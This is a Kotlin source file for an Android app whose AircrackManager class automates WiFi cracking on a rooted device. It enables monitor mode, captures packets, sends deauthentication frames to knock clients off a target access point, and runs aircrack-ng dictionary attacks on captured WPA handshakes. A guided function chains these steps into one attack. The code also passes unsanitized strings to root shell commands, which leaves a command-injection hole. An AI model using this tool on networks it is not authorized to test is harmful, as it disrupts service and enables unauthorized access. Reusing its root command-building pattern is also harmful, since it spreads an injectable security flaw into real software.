package com.example.utils

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

/**
 * Manages real Aircrack-ng binary detection and execution.
 *
 * LEGAL NOTE: Only use on networks you own or have explicit permission to audit.
 * Requirements:
 *  - Rooted Android device
 *  - WiFi chipset supporting monitor mode (Qualcomm Atheros, some Mediatek, external USB adapter via OTG)
 *  - aircrack-ng binary installed (via Kali NetHunter, Termux with kali-nh, or manually placed in /data/local/tmp/)
 */
class AircrackManager(private val context: Context) {

    // Possible binary locations
    private val binarySearchPaths = listOf(
        "/data/local/tmp/aircrack-ng",
        "/data/data/com.termux/files/usr/bin/aircrack-ng",
        "/system/xbin/aircrack-ng",
        "/system/bin/aircrack-ng",
        "/usr/bin/aircrack-ng",
        "/usr/local/bin/aircrack-ng",
        context.filesDir.absolutePath + "/aircrack-ng"
    )

    private val airodumpPaths = listOf(
        "/data/local/tmp/airodump-ng",
        "/data/data/com.termux/files/usr/bin/airodump-ng",
        "/system/xbin/airodump-ng",
        "/usr/bin/airodump-ng",
        context.filesDir.absolutePath + "/airodump-ng"
    )

    private val aireplayPaths = listOf(
        "/data/local/tmp/aireplay-ng",
        "/data/data/com.termux/files/usr/bin/aireplay-ng",
        "/system/xbin/aireplay-ng",
        "/usr/bin/aireplay-ng",
        context.filesDir.absolutePath + "/aireplay-ng"
    )

    private val airmonPaths = listOf(
        "/data/local/tmp/airmon-ng",
        "/data/data/com.termux/files/usr/bin/airmon-ng",
        "/system/xbin/airmon-ng",
        "/usr/bin/airmon-ng",
        context.filesDir.absolutePath + "/airmon-ng"
    )

    val captureDir: String = context.filesDir.absolutePath + "/captures"

    init {
        // Create capture directory
        File(captureDir).mkdirs()
    }

    // ========================
    // Binary Detection
    // ========================

    fun findBinary(paths: List<String>): String? =
        paths.firstOrNull { File(it).exists() && File(it).canExecute() }

    fun getAircrackPath(): String? = findBinary(binarySearchPaths)
    fun getAirodumpPath(): String? = findBinary(airodumpPaths)
    fun getAireplayPath(): String? = findBinary(aireplayPaths)
    fun getAirmonPath(): String? = findBinary(airmonPaths)

    fun isAircrackAvailable(): Boolean = getAircrackPath() != null
    fun isAirodumpAvailable(): Boolean = getAirodumpPath() != null
    fun isAireplayAvailable(): Boolean = getAireplayPath() != null
    fun isAirmonAvailable(): Boolean = getAirmonPath() != null

    fun getToolStatus(): ToolStatus {
        return ToolStatus(
            aircrack = getAircrackPath(),
            airodump = getAirodumpPath(),
            aireplay = getAireplayPath(),
            airmon = getAirmonPath()
        )
    }

    // ========================
    // Interface Management
    // ========================

    /**
     * List available network interfaces.
     */
    suspend fun listInterfaces(): List<String> = withContext(Dispatchers.IO) {
        try {
            val result = RealCommandExecutor.executeSync("ip link show", useRoot = true)
            result.stdout.lines()
                .filter { it.matches(Regex("\\d+:.*")) }
                .mapNotNull { line ->
                    val name = line.substringAfter(":").substringBefore(":").trim()
                    if (name != "lo") name else null
                }
        } catch (e: Exception) {
            emptyList()
        }
    }

    /**
     * Start monitor mode on an interface.
     * Tries airmon-ng first, then manual iw commands.
     */
    fun startMonitorMode(interface_: String): Flow<String> = flow {
        emit("[*] Attempting to enable monitor mode on $interface_...")

        val airmonPath = getAirmonPath()
        if (airmonPath != null) {
            emit("[+] Using airmon-ng: $airmonPath")
            val (exitCode, output) = RootChecker.executeAsRoot("$airmonPath start $interface_")
            output.lines().forEach { emit(it) }
            if (exitCode == 0) {
                emit("[+] Monitor mode enabled via airmon-ng")
                return@flow
            }
        }

        // Fallback to manual iw
        emit("[*] Trying manual iw method...")
        RootChecker.executeAsRoot("ip link set $interface_ down").second.lines().forEach { emit(it) }
        RootChecker.executeAsRoot("iw dev $interface_ set type monitor").second.lines().forEach { emit(it) }
        RootChecker.executeAsRoot("ip link set $interface_ up").second.lines().forEach { emit(it) }

        // Verify
        val (_, verifyOut) = RootChecker.executeAsRoot("iw dev $interface_ info")
        if (verifyOut.contains("type monitor")) {
            emit("[+] Monitor mode enabled on $interface_")
        } else {
            emit("[!] Monitor mode may not be supported on this chipset")
            emit("[!] Try an external USB WiFi adapter via OTG (e.g., Alfa AWUS036ACH)")
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Stop monitor mode, restore managed mode.
     */
    fun stopMonitorMode(interface_: String): Flow<String> = flow {
        emit("[*] Restoring managed mode on $interface_...")
        val airmonPath = getAirmonPath()
        if (airmonPath != null) {
            val (_, output) = RootChecker.executeAsRoot("$airmonPath stop $interface_")
            output.lines().forEach { emit(it) }
        } else {
            RootChecker.executeAsRoot("ip link set $interface_ down")
            RootChecker.executeAsRoot("iw dev $interface_ set type managed")
            RootChecker.executeAsRoot("ip link set $interface_ up")
            emit("[+] Managed mode restored")
        }
    }.flowOn(Dispatchers.IO)

    // ========================
    // Airodump-ng
    // ========================

    /**
     * Run airodump-ng for network discovery. Streams output.
     * @param interface_ Monitor mode interface (e.g., "wlan0mon")
     * @param bssid Optional: target specific BSSID
     * @param channel Optional: target specific channel
     * @param outputPrefix Optional: file prefix to save capture
     */
    fun runAirodump(
        interface_: String,
        bssid: String? = null,
        channel: Int? = null,
        outputPrefix: String? = null,
        durationSeconds: Int = 30
    ): Flow<String> = flow {
        val airodumpPath = getAirodumpPath()
        if (airodumpPath == null) {
            emit("[ERROR] airodump-ng not found!")
            emit("[INFO] Install via: Kali NetHunter, Termux with nethunter packages, or place binary in /data/local/tmp/")
            return@flow
        }

        var command = "$airodumpPath"
        bssid?.let { command += " --bssid $it" }
        channel?.let { command += " -c $it" }
        outputPrefix?.let { command += " -w $captureDir/$it --output-format pcap,csv" }
        command += " $interface_"

        emit("[*] Command: $command")
        emit("[*] Running for $durationSeconds seconds... (use Cancel to stop)")

        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val startTime = System.currentTimeMillis()
            val reader = process.inputStream.bufferedReader()
            val errReader = process.errorStream.bufferedReader()

            // Run for duration
            val thread = Thread {
                Thread.sleep(durationSeconds * 1000L)
                process.destroy()
            }
            thread.isDaemon = true
            thread.start()

            var line: String?
            while (reader.readLine().also { line = it } != null) {
                emit(line!!)
            }
            while (errReader.readLine().also { line = it } != null) {
                emit(line!!)
            }
            process.waitFor()
            outputPrefix?.let {
                emit("[+] Capture saved to: $captureDir/${it}-01.cap")
            }
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    // ========================
    // Aireplay-ng
    // ========================

    /**
     * Send deauthentication frames to force WPA handshake.
     * @param interface_ Monitor mode interface
     * @param bssid Target AP BSSID (e.g., "AA:BB:CC:DD:EE:FF")
     * @param clientMac Optional: specific client to deauth (null = broadcast)
     * @param count Number of deauth frames to send
     */
    fun runDeauth(
        interface_: String,
        bssid: String,
        clientMac: String? = null,
        count: Int = 10
    ): Flow<String> = flow {
        val aireplayPath = getAireplayPath()
        if (aireplayPath == null) {
            emit("[ERROR] aireplay-ng not found!")
            return@flow
        }

        var command = "$aireplayPath --deauth $count -a $bssid"
        clientMac?.let { command += " -c $it" }
        command += " $interface_"

        emit("[*] Command: $command")
        emit("[*] Sending $count deauth frames to $bssid...")

        val (exitCode, output) = RootChecker.executeAsRoot(command)
        output.lines().forEach { emit(it) }

        if (exitCode == 0) {
            emit("[+] Deauth frames sent successfully")
        } else {
            emit("[!] Deauth may have failed - ensure monitor mode is active")
        }
    }.flowOn(Dispatchers.IO)

    // ========================
    // Aircrack-ng (Dictionary Attack)
    // ========================

    /**
     * Run aircrack-ng dictionary attack against a captured handshake file.
     * @param capFile Path to .cap file containing handshake
     * @param wordlist Path to wordlist file
     * @param bssid Optional: target specific BSSID
     */
    fun runDictionaryAttack(
        capFile: String,
        wordlist: String,
        bssid: String? = null
    ): Flow<String> = flow {
        val aircrackPath = getAircrackPath()
        if (aircrackPath == null) {
            emit("[ERROR] aircrack-ng not found!")
            emit("[INFO] Search paths checked:")
            binarySearchPaths.forEach { emit("[INFO]   $it") }
            return@flow
        }

        if (!File(capFile).exists()) {
            emit("[ERROR] Capture file not found: $capFile")
            return@flow
        }
        if (!File(wordlist).exists()) {
            emit("[ERROR] Wordlist not found: $wordlist")
            emit("[INFO] Common wordlist locations on rooted devices:")
            emit("[INFO]   /data/local/tmp/rockyou.txt")
            emit("[INFO]   /data/data/com.termux/files/usr/share/wordlists/rockyou.txt")
            return@flow
        }

        var command = "$aircrackPath -w $wordlist"
        bssid?.let { command += " -b $it" }
        command += " $capFile"

        emit("[*] Starting dictionary attack...")
        emit("[*] Command: $command")
        emit("[*] Wordlist: $wordlist")
        emit("[*] Cap file: $capFile")

        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val reader = process.inputStream.bufferedReader()
            val errReader = process.errorStream.bufferedReader()

            var line: String?
            while (reader.readLine().also { line = it } != null) {
                emit(line!!)
            }
            while (errReader.readLine().also { line = it } != null) {
                emit(line!!)
            }
            val exitCode = process.waitFor()
            emit("[*] aircrack-ng exited with code: $exitCode")
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Common wordlist locations on Android.
     */
    fun findWordlists(): List<String> {
        val locations = listOf(
            "/data/local/tmp/rockyou.txt",
            "/data/local/tmp/wordlist.txt",
            "/data/data/com.termux/files/usr/share/wordlists/rockyou.txt",
            "/sdcard/wordlists/rockyou.txt",
            "/sdcard/Download/rockyou.txt",
            "/storage/emulated/0/wordlists/rockyou.txt",
            "/storage/emulated/0/Download/rockyou.txt",
            context.filesDir.absolutePath + "/rockyou.txt"
        )
        return locations.filter { File(it).exists() }
    }

    /**
     * List saved capture files.
     */
    fun listCaptureFiles(): List<File> {
        return File(captureDir).listFiles()?.filter {
            it.name.endsWith(".cap") || it.name.endsWith(".pcap")
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    /**
     * Full guided attack sequence: monitor mode -> airodump -> deauth -> aircrack
     */
    fun runGuidedAttack(
        interface_: String,
        targetBssid: String,
        targetSsid: String,
        channel: Int,
        wordlistPath: String
    ): Flow<String> = flow {
        emit("=" .repeat(50))
        emit("  AIRCRACK-NG GUIDED ATTACK: $targetSsid")
        emit("=" .repeat(50))
        emit("[!] LEGAL NOTICE: Only use on networks you own or have explicit permission to audit!")
        emit("")

        // Step 1: Enable monitor mode
        emit("[STEP 1/4] Enabling monitor mode on $interface_...")
        startMonitorMode(interface_).collect { emit(it) }
        val monInterface = "${interface_}mon"
        emit("")

        // Step 2: Capture handshake
        val capturePrefix = "capture_${targetSsid.take(8)}_${System.currentTimeMillis() / 1000}"
        emit("[STEP 2/4] Starting packet capture (30 seconds)...")
        emit("[*] Looking for WPA 4-way handshake...")

        // Run airodump in background briefly
        emit("[*] CMD: airodump-ng --bssid $targetBssid -c $channel -w $captureDir/$capturePrefix $monInterface")
        coroutineScope {
            val airodumpJob = launch {
                runAirodump(monInterface, targetBssid, channel, capturePrefix, 30).collect { emit(it) }
            }

            // Step 3: Deauth to force handshake
            kotlinx.coroutines.delay(5000)
            emit("")
            emit("[STEP 3/4] Sending deauth frames to force handshake capture...")
            runDeauth(monInterface, targetBssid, count = 10).collect { emit(it) }

            airodumpJob.join()
        }
        emit("")

        // Step 4: Dictionary attack
        val capFile = "$captureDir/${capturePrefix}-01.cap"
        emit("[STEP 4/4] Running dictionary attack against captured handshake...")
        runDictionaryAttack(capFile, wordlistPath, targetBssid).collect { emit(it) }

        emit("")
        emit("[*] Attack sequence complete.")
    }.flowOn(Dispatchers.IO)

    data class ToolStatus(
        val aircrack: String?,
        val airodump: String?,
        val aireplay: String?,
        val airmon: String?
    ) {
        val allAvailable: Boolean get() = aircrack != null && airodump != null && aireplay != null
        val summaryText: String
            get() = buildString {
                appendLine("aircrack-ng: ${aircrack ?: "NOT FOUND"}")
                appendLine("airodump-ng: ${airodump ?: "NOT FOUND"}")
                appendLine("aireplay-ng: ${aireplay ?: "NOT FOUND"}")
                appendLine("airmon-ng: ${airmon ?: "NOT FOUND"}")
            }
    }

}
